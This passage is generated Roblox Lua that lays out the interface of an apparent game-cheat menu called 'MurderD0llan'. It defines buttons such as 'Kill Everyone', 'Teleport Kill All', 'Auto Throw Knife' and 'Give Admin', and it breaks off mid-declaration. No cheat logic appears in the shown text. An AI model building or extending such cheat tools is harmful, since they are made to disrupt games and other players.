G2L["d3"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["d3"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["d3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d3"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.looptrade.UIGradient
G2L["d4"] = Instance.new("UIGradient", G2L["d2"]);
G2L["d4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.FastSeparator
G2L["d5"] = Instance.new("TextLabel", G2L["a5"]);
G2L["d5"]["TextWrapped"] = true;
G2L["d5"]["BorderSizePixel"] = 0;
G2L["d5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d5"]["TextSize"] = 16;
G2L["d5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d5"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["d5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d5"]["Text"] = [[- - -  ]];
G2L["d5"]["Name"] = [[FastSeparator]];
G2L["d5"]["BackgroundTransparency"] = 1;
G2L["d5"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.TemplateButton
G2L["d6"] = Instance.new("TextButton", G2L["a5"]);
G2L["d6"]["TextWrapped"] = true;
G2L["d6"]["TextStrokeTransparency"] = 0;
G2L["d6"]["BorderSizePixel"] = 0;
G2L["d6"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d6"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["d6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d6"]["TextSize"] = 20;
G2L["d6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["d6"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["d6"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["d6"]["Name"] = [[TemplateButton]];
G2L["d6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d6"]["Text"] = [[Check Role  ]];
G2L["d6"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.TemplateButton.UIGradient
G2L["d7"] = Instance.new("UIGradient", G2L["d6"]);
G2L["d7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.TemplateButton
G2L["d8"] = Instance.new("TextButton", G2L["a5"]);
G2L["d8"]["TextWrapped"] = true;
G2L["d8"]["TextStrokeTransparency"] = 0;
G2L["d8"]["BorderSizePixel"] = 0;
G2L["d8"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d8"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["d8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d8"]["TextSize"] = 20;
G2L["d8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["d8"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["d8"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["d8"]["Name"] = [[TemplateButton]];
G2L["d8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d8"]["Text"] = [[In Round  ]];
G2L["d8"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.TemplateButton.UIGradient
G2L["d9"] = Instance.new("UIGradient", G2L["d8"]);
G2L["d9"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.TemplateButton
G2L["da"] = Instance.new("TextButton", G2L["a5"]);
G2L["da"]["TextWrapped"] = true;
G2L["da"]["TextStrokeTransparency"] = 0;
G2L["da"]["BorderSizePixel"] = 0;
G2L["da"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["da"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["da"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["da"]["TextSize"] = 20;
G2L["da"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["da"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["da"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["da"]["Name"] = [[TemplateButton]];
G2L["da"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["da"]["Text"] = [[Check Pro Player (from 1 to 10)  ]];
G2L["da"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.TemplateButton.UIGradient
G2L["db"] = Instance.new("UIGradient", G2L["da"]);
G2L["db"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.FastSeparator
G2L["dc"] = Instance.new("TextLabel", G2L["a5"]);
G2L["dc"]["TextWrapped"] = true;
G2L["dc"]["BorderSizePixel"] = 0;
G2L["dc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["dc"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["dc"]["TextSize"] = 16;
G2L["dc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["dc"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["dc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["dc"]["Text"] = [[- - -  ]];
G2L["dc"]["Name"] = [[FastSeparator]];
G2L["dc"]["BackgroundTransparency"] = 1;
G2L["dc"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.giveAdmin
G2L["dd"] = Instance.new("TextButton", G2L["a5"]);
G2L["dd"]["TextWrapped"] = true;
G2L["dd"]["TextStrokeTransparency"] = 0;
G2L["dd"]["BorderSizePixel"] = 0;
G2L["dd"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["dd"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["dd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["dd"]["TextSize"] = 20;
G2L["dd"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["dd"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["dd"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["dd"]["Name"] = [[giveAdmin]];
G2L["dd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["dd"]["Text"] = [[Give MurderD0llan Admin  ]];
G2L["dd"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.giveAdmin.Frame
G2L["de"] = Instance.new("Frame", G2L["dd"]);
G2L["de"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["de"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["de"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["de"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.giveAdmin.UIGradient
G2L["df"] = Instance.new("UIGradient", G2L["dd"]);
G2L["df"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3
G2L["e0"] = Instance.new("ScrollingFrame", G2L["a"]);
G2L["e0"]["Active"] = true;
G2L["e0"]["BorderSizePixel"] = 0;
G2L["e0"]["CanvasSize"] = UDim2.new(0, 0, 0, 763);
G2L["e0"]["TopImage"] = [[]];
G2L["e0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e0"]["BackgroundTransparency"] = 0.9599999785423279;
G2L["e0"]["Size"] = UDim2.new(0, 367, 0, 228);
G2L["e0"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e0"]["Position"] = UDim2.new(0, 0, -6.667785612535226e-08, 0);
G2L["e0"]["Visible"] = false;
G2L["e0"]["Name"] = [[page_3]];
G2L["e0"]["BottomImage"] = [[]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.UIListLayout
G2L["e1"] = Instance.new("UIListLayout", G2L["e0"]);
G2L["e1"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["e1"]["Padding"] = UDim.new(0, 5);
G2L["e1"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.TemplateButton
G2L["e2"] = Instance.new("TextButton", G2L["e0"]);
G2L["e2"]["TextWrapped"] = true;
G2L["e2"]["TextStrokeTransparency"] = 0;
G2L["e2"]["BorderSizePixel"] = 0;
G2L["e2"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e2"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["e2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e2"]["TextSize"] = 20;
G2L["e2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["e2"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["e2"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["e2"]["Name"] = [[TemplateButton]];
G2L["e2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e2"]["Text"] = [[Kill Everyone  ]];
G2L["e2"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.TemplateButton.UIGradient
G2L["e3"] = Instance.new("UIGradient", G2L["e2"]);
G2L["e3"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.TemplateButton
G2L["e4"] = Instance.new("TextButton", G2L["e0"]);
G2L["e4"]["TextWrapped"] = true;
G2L["e4"]["TextStrokeTransparency"] = 0;
G2L["e4"]["BorderSizePixel"] = 0;
G2L["e4"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e4"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["e4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e4"]["TextSize"] = 20;
G2L["e4"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["e4"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["e4"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["e4"]["Name"] = [[TemplateButton]];
G2L["e4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e4"]["Text"] = [[Select Any One For Kill  ]];
G2L["e4"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.TemplateButton.UIGradient
G2L["e5"] = Instance.new("UIGradient", G2L["e4"]);
G2L["e5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.autokilleveryone
G2L["e6"] = Instance.new("TextButton", G2L["e0"]);
G2L["e6"]["TextWrapped"] = true;
G2L["e6"]["TextStrokeTransparency"] = 0;
G2L["e6"]["BorderSizePixel"] = 0;
G2L["e6"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e6"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["e6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e6"]["TextSize"] = 20;
G2L["e6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["e6"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["e6"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["e6"]["Name"] = [[autokilleveryone]];
G2L["e6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e6"]["Text"] = [[Auto Kill Everyone  ]];
G2L["e6"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.autokilleveryone.Frame
G2L["e7"] = Instance.new("Frame", G2L["e6"]);
G2L["e7"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["e7"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["e7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e7"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.autokilleveryone.UIGradient
G2L["e8"] = Instance.new("UIGradient", G2L["e6"]);
G2L["e8"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.Separator
G2L["e9"] = Instance.new("TextLabel", G2L["e0"]);
G2L["e9"]["TextWrapped"] = true;
G2L["e9"]["BorderSizePixel"] = 0;
G2L["e9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e9"]["TextSize"] = 16;
G2L["e9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e9"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["e9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e9"]["Text"] = [[- - - - - - - - - -  - - - - - - - - - -  - - - - - - - - - -  ]];
G2L["e9"]["Name"] = [[Separator]];
G2L["e9"]["BackgroundTransparency"] = 1;
G2L["e9"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.autothrowknifewhenvisibleplayer
G2L["ea"] = Instance.new("TextButton", G2L["e0"]);
G2L["ea"]["TextWrapped"] = true;
G2L["ea"]["TextStrokeTransparency"] = 0;
G2L["ea"]["BorderSizePixel"] = 0;
G2L["ea"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ea"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["ea"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ea"]["TextSize"] = 20;
G2L["ea"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["ea"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["ea"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["ea"]["Name"] = [[autothrowknifewhenvisibleplayer]];
G2L["ea"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ea"]["Text"] = [[Auto Throw Knife  ]];
G2L["ea"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.autothrowknifewhenvisibleplayer.Frame
G2L["eb"] = Instance.new("Frame", G2L["ea"]);
G2L["eb"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["eb"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["eb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["eb"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.autothrowknifewhenvisibleplayer.UIGradient
G2L["ec"] = Instance.new("UIGradient", G2L["ea"]);
G2L["ec"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.TemplateButton
G2L["ed"] = Instance.new("TextButton", G2L["e0"]);
G2L["ed"]["TextWrapped"] = true;
G2L["ed"]["TextStrokeTransparency"] = 0;
G2L["ed"]["BorderSizePixel"] = 0;
G2L["ed"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ed"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["ed"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ed"]["TextSize"] = 20;
G2L["ed"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["ed"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["ed"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["ed"]["Name"] = [[TemplateButton]];
G2L["ed"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ed"]["Text"] = [[Select Key For Predict Throw Knife  ]];
G2L["ed"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);
-- Attributes
G2L["ed"]:SetAttribute([[SELECTED_KEY]], [[Unknown]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.TemplateButton.UIGradient
G2L["ee"] = Instance.new("UIGradient", G2L["ed"]);
G2L["ee"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.presskeyforpredictthrowknife
G2L["ef"] = Instance.new("TextButton", G2L["e0"]);
G2L["ef"]["TextWrapped"] = true;
G2L["ef"]["TextStrokeTransparency"] = 0;
G2L["ef"]["BorderSizePixel"] = 0;
G2L["ef"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ef"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["ef"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ef"]["TextSize"] = 20;
G2L["ef"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["ef"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["ef"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["ef"]["Name"] = [[presskeyforpredictthrowknife]];
G2L["ef"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ef"]["Text"] = [[ Key for Predict Throw Knife  ]];
G2L["ef"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.presskeyforpredictthrowknife.Frame
G2L["f0"] = Instance.new("Frame", G2L["ef"]);
G2L["f0"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["f0"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["f0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f0"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.presskeyforpredictthrowknife.UIGradient
G2L["f1"] = Instance.new("UIGradient", G2L["ef"]);
G2L["f1"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.FastSeparator
G2L["f2"] = Instance.new("TextLabel", G2L["e0"]);
G2L["f2"]["TextWrapped"] = true;
G2L["f2"]["BorderSizePixel"] = 0;
G2L["f2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f2"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f2"]["TextSize"] = 16;
G2L["f2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f2"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["f2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f2"]["Text"] = [[- - -  ]];
G2L["f2"]["Name"] = [[FastSeparator]];
G2L["f2"]["BackgroundTransparency"] = 1;
G2L["f2"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.TemplateButton
G2L["f3"] = Instance.new("TextButton", G2L["e0"]);
G2L["f3"]["TextWrapped"] = true;
G2L["f3"]["TextStrokeTransparency"] = 0;
G2L["f3"]["BorderSizePixel"] = 0;
G2L["f3"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f3"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["f3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f3"]["TextSize"] = 20;
G2L["f3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["f3"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["f3"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["f3"]["Name"] = [[TemplateButton]];
G2L["f3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f3"]["Text"] = [[Teleport Kill All  ]];
G2L["f3"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.TemplateButton.UIGradient
G2L["f4"] = Instance.new("UIGradient", G2L["f3"]);
G2L["f4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.trashtalkwhenkillingsomeone
G2L["f5"] = Instance.new("TextButton", G2L["e0"]);
G2L["f5"]["TextWrapped"] = true;
G2L["f5"]["TextStrokeTransparency"] = 0;
G2L["f5"]["BorderSizePixel"] = 0;
G2L["f5"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f5"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["f5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f5"]["TextSize"] = 18;
G2L["f5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["f5"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["f5"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["f5"]["Name"] = [[trashtalkwhenkillingsomeone]];
G2L["f5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f5"]["Text"] = [[TrashTalk when killing Someone  ]];
G2L["f5"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.trashtalkwhenkillingsomeone.Frame
G2L["f6"] = Instance.new("Frame", G2L["f5"]);
G2L["f6"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["f6"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["f6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f6"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.trashtalkwhenkillingsomeone.UIGradient
G2L["f7"] = Instance.new("UIGradient", G2L["f5"]);
G2L["f7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.antimurder
G2L["f8"] = Instance.new("TextButton", G2L["e0"]);
G2L["f8"]["TextWrapped"] = true;
G2L["f8"]["TextStrokeTransparency"] = 0;
G2L["f8"]["BorderSizePixel"] = 0;
G2L["f8"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f8"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["f8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f8"]["TextSize"] = 20;
G2L["f8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["f8"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["f8"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["f8"]["Name"] = [[antimurder]];
G2L["f8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f8"]["Text"] = [[Anti-Murder  ]];
G2L["f8"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.antimurder.Frame
G2L["f9"] = Instance.new("Frame", G2L["f8"]);
G2L["f9"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["f9"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["f9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f9"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.antimurder.UIGradient
G2L["fa"] = Instance.new("UIGradient", G2L["f8"]);
G2L["fa"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.HandlerV3
G2L["fb"] = Instance.new("LocalScript", G2L["e0"]);
G2L["fb"]["Name"] = [[HandlerV3]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.killsherrifwhenbeingmurder
G2L["fc"] = Instance.new("TextButton", G2L["e0"]);
G2L["fc"]["TextWrapped"] = true;
G2L["fc"]["TextStrokeTransparency"] = 0;
G2L["fc"]["BorderSizePixel"] = 0;
G2L["fc"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["fc"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["fc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["fc"]["TextSize"] = 18;
G2L["fc"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["fc"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["fc"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["fc"]["Name"] = [[killsherrifwhenbeingmurder]];
G2L["fc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fc"]["Text"] = [[Kill Sheriff When Being Murder  ]];
G2L["fc"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.killsherrifwhenbeingmurder.Frame
G2L["fd"] = Instance.new("Frame", G2L["fc"]);
G2L["fd"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["fd"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["fd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fd"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.killsherrifwhenbeingmurder.UIGradient
G2L["fe"] = Instance.new("UIGradient", G2L["fc"]);
G2L["fe"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.activateKnifeWhenNearPlayer
G2L["ff"] = Instance.new("TextButton", G2L["e0"]);
